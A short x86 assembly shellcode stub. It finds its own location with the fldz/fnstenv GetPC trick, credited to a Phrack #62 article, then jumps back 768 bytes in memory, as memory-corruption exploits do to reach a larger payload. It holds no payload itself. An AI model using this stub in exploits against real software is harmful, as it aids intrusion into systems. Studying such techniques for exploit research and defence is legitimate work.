[BITS 32]

global _start
_start:

;--- copy eip into ecx
;--- Taken from Phrack #62 Article 7 Originally written by Aaron Adams
;http://phrack.org/issues/62/7.html (search the page for Aaron Adams)

fldz
fnstenv [esp-12]
pop ecx
add cl, 10
nop

;--- Decrease ecx and jump to it
dec ch ; ecx=-256;
dec ch ; ecx=-256;
dec ch ; ecx=-256;
jmp ecx ;